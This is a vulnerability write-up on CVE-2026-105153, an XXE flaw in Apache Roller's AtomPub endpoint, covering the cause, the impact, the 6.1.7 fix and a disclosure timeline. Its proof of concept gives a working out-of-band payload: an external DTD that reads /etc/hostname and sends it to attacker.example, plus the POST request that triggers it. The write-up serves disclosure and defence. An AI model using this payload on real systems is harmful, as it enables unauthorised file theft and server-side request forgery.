---
title: "Apache Roller: XXE in AtomPub Entry Parsing"
date: 2026-11-11
target: "Apache Roller"
severity: High
identifier: "CVE-2026-105153"
advisory_url: "https://www.cve.org/CVERecord?id=CVE-2026-105153"
summary: "Roller's AtomPub endpoint parsed entry bodies with an XML reader that still resolved external parameter entities and external DTD subsets, so any authenticated account could read local files and make the server fetch internal URLs. The body was parsed before the authorization check and even when AtomPub was turned off. Fixed in 6.1.7."
---

## Summary

Apache Roller ships an AtomPub (RFC 5023) endpoint for publishing blog entries over HTTP. The servlet behind that endpoint parsed the request body with an XML reader that was only half hardened: it blocked classic external general entities but still resolved external parameter entities and external DTD subsets. That is enough for a full out of band XXE.

Two things made it worse than a typical authenticated XXE. The body was parsed before any permission check ran, so any valid Roller account could reach the sink regardless of weblog membership. And the parse happened on write requests even when the AtomPub feature was disabled, because the on/off switch was only checked on the service document GET, not on the POST and PUT paths that actually parse input.

The result was authenticated local file read, exfiltrated out of band, plus server side request forgery against whatever the server could reach. It is fixed in Roller 6.1.7 as CVE-2026-105153.

## Background

Roller maps the AtomPub servlet in `web.xml`:

```xml
<servlet-mapping>
  <servlet-name>AtomServlet</servlet-name>
  <url-pattern>/roller-services/app/*</url-pattern>
</servlet-mapping>
```

The servlet class is `com.rometools.propono.atom.server.AtomServlet`, from the ROME Propono library. Roller pins `rome.version=1.19.0` in `app/pom.xml`, with a comment that the dependency is locked in place because the next ROME release removes Propono.

On a write, `AtomServlet.doPost` and `doPut` hand the request body to:

```java
Atom10Parser.parseEntry(reader, null, Locale.US);
```

That helper, in ROME 1.19.0, builds its parser like this:

```java
SAXBuilder builder = new SAXBuilder();
builder.setExpandEntities(false);
Document document = builder.build(reader);
```

## The vulnerability

`setExpandEntities(false)` sounds like it disables entity processing. It does not. On JDOM2 2.0.6.1 that single call only sets the SAX feature `http://xml.org/sax/features/external-general-entities` to false. It leaves external **parameter** entities and external **DTD subsets** fully enabled.

So the obvious payload, a general entity reflected into the document text, is blocked:

```xml
<!DOCTYPE entry [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<entry ...>&x;</entry>   <!-- does not resolve -->
```

But the out of band form, built from parameter entities and an external DTD, works fine. The parser never sees a `disallow-doctype-decl` feature, so the DOCTYPE is accepted and the external subset is fetched and evaluated.

It is worth noting that ROME already knows how to do this safely elsewhere. Its `WireFeedInput` path, used when Roller fetches remote feeds, sets `disallow-doctype-decl` and refuses DOCTYPEs outright. The `parseEntry` helper used by the AtomPub servlet simply never applied the same hardening.

Two design facts turn this from a theoretical parser quirk into a reachable bug.

First, order of operations. The servlet parses the body at the top of `doPost`/`doPut`, before it resolves the target weblog and before the `canEdit` style authorization in `postEntry`/`putEntry`. The parse is the first thing that touches attacker input. A request aimed at a weblog that does not exist, or one the caller has no rights to, still gets its body parsed and so still fires the entities. Authentication is required, but nothing more: any registered account is enough.

Second, the feature flag. Roller has a `webservices.enableAtomPub` setting that defaults to false. You might expect that to close the endpoint. It did not close the write paths. The flag was enforced only on the service document GET. `doPost` and `doPut` parsed the body whether or not AtomPub was enabled, so a deployment that had deliberately left AtomPub off was still exposed.

## Proof of concept

Host an external DTD that reads a local file and sends its contents out as a query string:

```dtd
<!-- http://attacker.example/x.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://attacker.example/leak?%file;'>">
%wrap;
%send;
```

Send any Atom entry whose DOCTYPE points at that DTD, to the AtomPub entries collection of any weblog name, authenticating as any Roller account:

```http
POST /roller-services/app/anyblog/entries HTTP/1.1
Host: victim
Authorization: Basic <any valid Roller user>
Content-Type: application/atom+xml

<?xml version="1.0"?>
<!DOCTYPE entry SYSTEM "http://attacker.example/x.dtd">
<entry xmlns="http://www.w3.org/2005/Atom"><title>x</title></entry>
```

The server fetches `x.dtd`, reads `/etc/hostname`, and makes an outbound request to `http://attacker.example/leak?<file contents>`. The same shape with an `http://` system identifier instead of `file://` turns the server into an SSRF client against internal hosts. The entry does not have to be accepted for the parse to happen: a nonexistent weblog returns 404 only after the body has already been parsed.

The CVSS 3.1 vector is `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`, 7.7, which the project rated Important.

## Impact

An attacker who holds any Roller account, including a low privilege one with no weblog of its own, can:

- Read files the Roller process can read, exfiltrated out of band through the parameter entity chain.
- Drive server side requests to internal addresses that are not reachable from outside, using the DTD or entity system identifier as the SSRF target.

Because the parse runs ahead of authorization and ignores the AtomPub feature switch, neither weblog permissions nor a disabled AtomPub configuration protected a deployment.

## The fix

Roller 6.1.7 fixes this in two merged changes.

The first adds a hardened entry gate in Roller's own servlet layer. Before Propono ever parses the body, `RollerAtomServlet` pre parses exactly the same bytes with a `SafeSAXBuilder` that refuses DTDs and external entities, classifying the request the same way the Propono servlet does so the gate covers precisely the write paths that reach `parseEntry`. The same change enforces `webservices.enableAtomPub` on every request, returning 404 when the feature is off, and caps entry size so an oversized body is rejected with 413.

The second change introduces a shared secure XML builder, based on Apache Commons Secure XML, and applies it fail closed to the AtomPub pre parse and to the XML-RPC surface as well.

The root cause lives upstream in `rome`/`rome-propono` 1.19.0, but the exposed endpoint was Roller's, so Roller closed it at its own boundary rather than waiting on the pinned dependency.

## Timeline

- 2026-09-28: Reported to the Apache Security team.
- 2026-09-29: Acknowledged and routed to the Roller project.
- 2026-09-30: Reproduced and accepted by the project.
- 2026-10-09: Fix merged and CVE-2026-105153 assigned.
- 2026-11-11: Roller 6.1.7 released and the advisory made public.

## References

- [CVE-2026-105153](https://www.cve.org/CVERecord?id=CVE-2026-105153)
- [Apache Roller security advisories](https://roller.apache.org/security.html)
- [ASF advisory announcement](https://lists.apache.org/thread/w7dsz19261myrcwx8ssbwr67hc1wfosj)

Credited to Kaya Emre Arikan.
